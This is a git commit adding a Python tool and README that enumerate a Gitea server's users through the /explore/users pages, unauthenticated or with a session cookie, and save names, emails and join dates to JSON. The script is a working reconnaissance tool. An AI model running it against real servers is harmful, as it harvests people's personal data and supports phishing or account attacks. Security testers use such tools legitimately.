53c1c61db92498e143e735a60ff943905a234ecd
Podalirius <podalirius@protonmail.com>
2022-12-20 17:17:27 +0100

    Public release 1.1

--- README.md
+++ README.md
@@ -1,1 +1,52 @@
 # gitea-extract-users
+
+<p align="center">
+  A Python script to extract the list of users of a GiTea instance, unauthenticated or authenticated.
+  <br>
+  <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/p0dalirius/Joomla-1.6-1.7-2.5-Privilege-Escalation-Vulnerability">
+  <a href="https://twitter.com/intent/follow?screen_name=podalirius_" title="Follow"><img src="https://img.shields.io/twitter/follow/podalirius_?label=Podalirius&style=social"></a>
+  <a href="https://www.youtube.com/c/Podalirius_?sub_confirmation=1" title="Subscribe"><img alt="YouTube Channel Subscribers" src="https://img.shields.io/youtube/channel/subscribers/UCF_x5O7CSfr82AfNVTKOv_A?style=social"></a>
+  <br>
+</p>
+
+## Features
+
+ - [x] Dump all users of a remote GiTea instance, unauthenticated (misconfiguration of the instance).
+ - [x] Dump all users of a remote GiTea instance, authenticated using `i_like_gitea` cookie in `--cookie` option.
+ - [x] Export users and emails to a JSON file, specified by option `--outfile`.
+
+## Usage
+
+```
+$ ./gitea-extract-users.py -h
+Dump GiTea users via /explore/users endpoint - v1.1 - by @podalirius_
+
+usage: gitea-extract-users.py [-h] -t TARGET [-o OUTFILE] [-c COOKIE]
+
+Dump GiTea users via /explore/users endpoint
+
+options:
+  -h, --help            show this help message and exit
+  -t TARGET, --target TARGET
+                        IP address or hostname of the GiTea to target.
+  -o OUTFILE, --outfile OUTFILE
+                        Output JSON file of all the found users.
+  -c COOKIE, --cookie COOKIE
+                        i_like_gitea cookie to dump users in authenticated mode.
+```
+
+## Example output format:
+
+```json
+{
+    "target": "https://git.podalirius.poc",
+    "users": [
+        {
+            "mail": "podalirius@podalirius.poc",
+            "username": "Podalirius",
+            "fullname": "Podalirius Podalirius",
+            "joined": "Nov 05, 1605"
+        }
+    ]
+}
+```
---
+++ gitea-extract-users.py
@@ -0,0 +1,140 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# File name          : gitea-extract-users.py
+# Author             : Podalirius (@podalirius_)
+# Date created       : 20 Dec 2022
+
+
+import argparse
+import datetime
+import json
+import sys
+from bs4 import BeautifulSoup
+import requests
+requests.packages.urllib3.disable_warnings()
+requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
+try:
+    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
+except AttributeError:
+    pass
+
+
+def can_access_unauthenticated(target, cookie=None):
+    url = target + "/explore/users"
+
+    cookies = {'lang': 'en-US'}
+    if cookie != None:
+        cookies['i_like_gitea'] = cookie
+
+    r = requests.get(url, cookies=cookies, verify=False)
+
+    if r.status_code == 404:
+        print('\x1b[1;91m[404]\x1b[0m No /explore/users found on this server.')
+        print('\x1b[1m[\x1b[93m+\x1b[0m\x1b[1m]\x1b[0m Exiting ...')
+        sys.exit(-1)
+
+    if b"You are not allowed to view users publicly." in r.content or b"Username or Email Address" in r.content:
+        return False
+    else:
+        return True
+
+
+def extract_gitea_users(target):
+    data = {"target": target, "users": []}
+
+    page_number = 1
+    continue_crawling = True
+    while continue_crawling:
+        url = target + "/explore/users?sort=alphabetically&page=%d&q=&tab=" % page_number
+        r = requests.get(
+            url,
+            cookies=cookies,
+            verify=False
+        )
+        if b"No matching users found." in r.content or bytes("Aucun utilisateur correspondant n'a été trouvé.", 'UTF-8') in r.content:
+            print('\n[+] Done processing.')
+            continue_crawling = False
+        else:
+            print('\r   [>] Parsing page %d (extracted %d users yet)...' % (page_number, len(data['users'])), end="")
+
+            soup = BeautifulSoup(r.content, 'lxml')
+            s = soup.find('div', attrs={'class': 'user'})
+
+            if s is None:
+                print("\n[!] Could not find users on this page.")
+                return None
+
+            for user_parser in s.find_all('div', attrs={'class': 'content'}):
+                user = {}
+                descr = user_parser.find('div', attrs={'class': 'description'})
+                # Parsing mail if exists
+                if 'mailto:' in str(descr):
+                    mail = descr.find('a')['href'].replace('mailto:', '')
+                else:
+                    mail = ""
+                user['mail'] = mail
+                #
+                user['username'] = user_parser.find('span', attrs={'class': 'header'}).find("a").text.strip()
+                user['fullname'] = str(user_parser.find('span', attrs={'class': 'header'})).split('</a>', 1)[1].split('</span>', 1)[0].strip()
+
+                # if 'location' in str(descr):
+                #     user['location'] = [e for e in str(user_parser).split('\n') if "location" in e]
+                #     print(user['location'])
+                # else :
+                #     user['location'] = ""
+                # Parsing location if exists
+                if 'Joined on' in str(descr):
+                    joined = str(user_parser).strip().split('Joined on')[1].split('<')[0].strip()
+                else:
+                    joined = ""
+                user['joined'] = joined
+                #
+                data['users'].append(user)
+            page_number += 1
+
+    return data
+
+
+def parseArgs():
+    print("Dump GiTea users via /explore/users endpoint - v1.1 - by @podalirius_\n")
+    parser = argparse.ArgumentParser(description="Dump GiTea users via /explore/users endpoint")
+    parser.add_argument('-t', '--target', required=True, help='IP address or hostname of the GiTea to target.')
+    parser.add_argument('-o', '--outfile', required=False, default=None, help='Output JSON file of all the found users.')
+    parser.add_argument('-c', '--cookie', required=False, default=None, help='i_like_gitea cookie to dump users in authenticated mode.')
+    return parser.parse_args()
+
+
+if __name__ == '__main__':
+    options = parseArgs()
+
+    options.target = options.target.rstrip("/")
+    if not options.target.startswith("http://") and not options.target.startswith("https://"):
+        options.target = "https://" + options.target
+
+    print('[+] Target : %s \n' % options.target)
+
+    cookies = {'lang': 'en-US'}
+    if options.cookie is None:
+        print('[+] Checking if /explore/users is public or not ...')
+        vulnerable = can_access_unauthenticated(options.target)
+        if not vulnerable:
+            print('[-] You need to be connected to access /explore/users on this server.')
+            print('[+] Exiting ...')
+        else:
+            print('[+] Target appears to be vulnerable !')
+    else:
+        print('[+] Trying to access /explore/users authenticated with cookie: %s=%s \n' % ("i_like_gitea", options.target))
+        cookies['i_like_gitea'] = options.cookie
+
+    data = extract_gitea_users(target=options.target)
+
+    if data is not None:
+        if options.outfile is None:
+            domain = options.target.split('/')[2]
+            options.outfile = 'GiTea_users_%s_%s.json' % (domain, datetime.datetime.now().strftime('%Y_%h_%d_%Hh%Mm%Ss'))
+        print('[+] Writing results to %s' % options.outfile)
+        f = open(options.outfile, "w")
+        f.write(json.dumps(data, indent=4))
+        f.close()
+
+    print('[+] All done !')
